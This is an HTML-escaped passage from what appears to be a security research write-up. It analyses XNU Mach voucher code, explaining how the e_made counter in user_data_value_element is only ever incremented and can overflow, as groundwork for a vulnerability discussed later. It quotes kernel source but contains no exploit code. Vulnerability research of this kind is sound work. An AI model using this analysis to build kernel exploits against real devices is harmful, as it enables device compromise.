class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; alloc&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;e_hash &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;hash&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; memcpy&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;alloc&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;e_data&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;content&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;content_size&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;goto&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;retry&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; queue_enter&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;user_data_bucket&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;[&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;hash&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;],&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;alloc&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;user_data_element_t&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;e_hash_link&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; user_data_unlock&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;();&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;return&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;alloc&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data&lt;/span&gt;&lt;span&gt;&amp;nbsp;attributes are just uniquified buffer pointers. Each buffer is represented by a &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data_value_element&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;structure, which has a meta-data header followed by a variable-sized inline buffer containing the arbitrary byte data:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.3f4fc041af984f11d98fc5aca7a145c07ded181d\"&gt;&lt;/a&gt;&lt;a id=\"t.29\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;struct&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;user_data_value_element &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_value_reference_t &amp;nbsp; &amp;nbsp; e_made&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_content_size_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;e_size&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; iv_index_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;e_sum&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; iv_index_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;e_hash&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; queue_chain_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; e_hash_link&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; uint8_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; e_data&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;[];&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;};&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;Pointers to those elements are stored in the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data_bucket&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;hash table.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data_dedup&lt;/span&gt;&lt;span&gt;&amp;nbsp;searches the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data_bucket&lt;/span&gt;&lt;span&gt;&amp;nbsp;hash table to see if a matching &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;nbsp;already exists. If not, it allocates one and adds it to the hash table. Note that it&amp;#39;s not allowed to hold locks while calling &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;kalloc()&lt;/span&gt;&lt;span&gt;&amp;nbsp;so the code first has to drop the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data&lt;/span&gt;&lt;span&gt;&amp;nbsp;lock, allocate a &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;nbsp;then take the lock again and check the hash table a second time to ensure that another thread didn&amp;#39;t also allocate and insert a matching &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data_value_element&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;while the lock was dropped.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;field of &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data_value_element&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;is critical to the vulnerability we&amp;#39;re eventually going to discuss, so let&amp;#39;s examine its use here.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;If a new &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;nbsp;is created its &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;field is initialized to 1. If an existing &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;nbsp;is found which matches the requested content buffer the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;field is incremented before a pointer to that &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;nbsp;is returned. Redeeming a &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;nbsp;(via the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;MACH_VOUCHER_ATTR_REDEEM&lt;/span&gt;&lt;span&gt;&amp;nbsp;command) also just increments the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;of the element being redeemed before returning it. The type of the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;field is &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;mach_voucher_attr_value_reference_t&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;so it&amp;#39;s tempting to believe that this field is a reference count. The reality is more subtle than that though.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;The first hint that &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;isn&amp;#39;t exactly a reference count is that if you search for &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;in XNU you&amp;#39;ll notice that it&amp;#39;s never decremented. There are also no places where a pointer to that structure is cast to another type which treats the first dword as a reference count. &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;can only ever go up (well technically there&amp;#39;s also nothing stopping it overflowing so it can also go down 1 in every 2&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c28\"&gt;32&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;increments...)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;Let&amp;#39;s go back up the stack to the caller of &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data_get_value&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ipc_replace_voucher_value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;The next part is again code for unused functionality. No current voucher attr type implementations return a &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;new_value_voucher&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;so this condition is never true:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.4f6b8727516fb3c9c48ebff520ad8874f31f22d6\"&gt;&lt;/a&gt;&lt;a id=\"t.30\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* TODO: value insertion from returned voucher */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;if&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;IV_NULL &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;!=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;new_value_voucher&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; iv_release&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;new_value_voucher&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;Next, the code needs to wrap &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;new_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;in an &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_entry&lt;/span&gt;&lt;span&gt;&amp;nbsp;and determine the index of that &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_entry&lt;/span&gt;&lt;span&gt;&amp;nbsp;in the controller&amp;#39;s table of values. This is done by &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_reference_by_value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.c4c5981b6f20ec9de21a50072140d8a412c4cbbe\"&gt;&lt;/a&gt;&lt;a id=\"t.31\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/*&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* Find or create a slot in the table associated&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* with this attribute value. &amp;nbsp;The ivac reference&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* is transferred to a new value, or consumed if&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* we find a matching existing value.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;*/&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; val_index &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;ivace_reference_by_value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;new_value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;new_flag&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; iv_set&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;voucher&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;key_index&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;val_index&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.14867f48cf979ee62c6fdccbefa3859e7dda3ebe\"&gt;&lt;/a&gt;&lt;a id=\"t.32\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/*&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;&amp;nbsp;* Look up the values for a given &amp;lt;key, index&amp;gt; pair.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;&amp;nbsp;*&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;&amp;nbsp;* Consumes a reference on the passed voucher control.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;&amp;nbsp;* Either it is donated to a newly-created value cache&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;&amp;nbsp;* or it is released (if we piggy back on an existing&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;&amp;nbsp;* value cache entry).&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;&amp;nbsp;*/&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;static&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&amp;nbsp;iv_index_t&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_reference_by_value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ipc_voucher_attr_control_t &amp;nbsp; &amp;nbsp; &amp;nbsp;ivac&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_value_handle_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_value_flags_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;flag&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_entry_t ivace &lt;/span&gt;&lt;span 